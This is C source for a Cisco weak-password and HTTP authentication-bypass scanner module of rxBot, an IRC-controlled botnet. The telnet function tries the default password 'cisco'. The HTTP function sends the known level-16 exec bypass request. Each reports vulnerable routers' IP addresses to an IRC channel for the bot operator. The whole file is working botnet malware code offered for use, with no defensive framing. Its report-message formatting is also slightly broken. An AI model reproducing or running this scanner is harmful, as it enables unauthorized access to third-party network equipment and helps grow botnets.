/*

  koncool's Cisco Weak Password Scanner for rxBot
  Based on ciscos.c and cisco_scanner.c, made for bilal ;>

*/

#ifndef NO_CISCO

#include "includes.h"
#include "functions.h"
#include "externs.h"

#define HTTP_REQUEST "GET /level/16/exec/-///pwd  HTTP/1.0\n\n"

BOOL Cisco(EXINFO exinfo)
{

   int ret,SocketFD;
   char buffer1[64],buffer2[64];
   if((SocketFD = fsocket(AF_INET, SOCK_STREAM, 0)) < 0) return FALSE;;
   SOCKADDR_IN ssin;
   memset(&ssin, 0, sizeof(ssin));
   ssin.sin_family = AF_INET;
   ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
   ssin.sin_port = fhtons((unsigned short)exinfo.port);
   if(fconnect(SocketFD, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
         memset(buffer1, '\0', 64);
         memset(buffer2, '\0', 64);
         if ((ret = frecv(SocketFD, buffer1, 64, 0))  > 0)
         {
            ret = frecv(SocketFD, buffer1, 64, 0);
            fsend(SocketFD,"cisco\r",6,0);
            ret = frecv(SocketFD, buffer2, 64, 0);

			if( (memcmp(buffer2,"\r\nPass",6)) && !(memcmp(buffer1,"\r\n\r\nUser Access Verification\r\n\r\nPassword",40)))
			{
				char sendbuf[IRCLINE];
				_snprintf(sendbuf, sizeof(sendbuf), "-\x03\x34\2cisco(telnet)\x03\2- found router: %s", exploit[exinfo.exploit].name, exinfo.ip);
				irc_privmsg(exinfo.sock, exinfo.chan, sendbuf, exinfo.notice);
				addlog(sendbuf);
				exploit[exinfo.exploit].stats++;
				return TRUE;
			}
		 }
	}
    return FALSE;
}

BOOL CiscoHTTP(EXINFO exinfo)
{

   int ret,SocketFD;
   char buffer[4096];
   if((SocketFD = fsocket(AF_INET, SOCK_STREAM, 0)) < 0) return FALSE;;
   SOCKADDR_IN ssin;
   memset(&ssin, 0, sizeof(ssin));
   ssin.sin_family = AF_INET;
   ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
   ssin.sin_port = fhtons((unsigned short)exinfo.port);
   if(fconnect(SocketFD, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
		if(fsend(SocketFD, HTTP_REQUEST, strlen(HTTP_REQUEST), 0) < 0)
			return FALSE;
		memset(buffer, 0, sizeof(buffer));
		if((ret = frecv(SocketFD, buffer, sizeof(buffer), 0)) < 0)
			return FALSE;
		fclosesocket(SocketFD);
		if(ret < 5)
			return FALSE;
		if(strstr(buffer, "HTTP/1.0 200 OK") == NULL || strstr(buffer, "cisco") == NULL)
			return FALSE;

		char sendbuf[IRCLINE];
		_snprintf(sendbuf, sizeof(sendbuf), "-\x03\x34\2cisco(http)\x03\2- found router: %s", exploit[exinfo.exploit].name, exinfo.ip);
		irc_privmsg(exinfo.sock, exinfo.chan, sendbuf, exinfo.notice);
		addlog(sendbuf);
		exploit[exinfo.exploit].stats++;
		return TRUE;
	}
    return FALSE;
}
#endif
